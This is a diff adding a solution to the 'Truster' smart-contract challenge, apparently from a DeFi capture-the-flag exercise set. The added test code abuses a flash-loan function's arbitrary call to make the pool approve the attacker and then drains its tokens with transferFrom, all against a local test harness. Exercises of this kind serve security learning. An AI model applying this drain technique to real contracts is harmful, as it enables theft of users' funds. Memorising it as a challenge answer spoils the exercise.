@@ -29,6 +29,26 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // ERC20 approve 
+        const approveSign = 'function approve(address spender, uint256 amount) returns (bool)';
+        const iface = new ethers.utils.Interface([approveSign]);
+        const approveData = iface.encodeFunctionData('approve', [attacker.address, String(TOKENS_IN_POOL)]);
+        // console.log(approveData);
+
+        let tx = await this.pool.connect(attacker).flashLoan(
+            ethers.constants.Zero,
+            attacker.address,
+            this.token.address,
+            approveData
+        );
+        await tx.wait();
+
+        tx = await this.token.connect(attacker).transferFrom(
+            this.pool.address,
+            attacker.address,
+            TOKENS_IN_POOL
+        );
+        await tx.wait();
     });
 
     after(async function () {
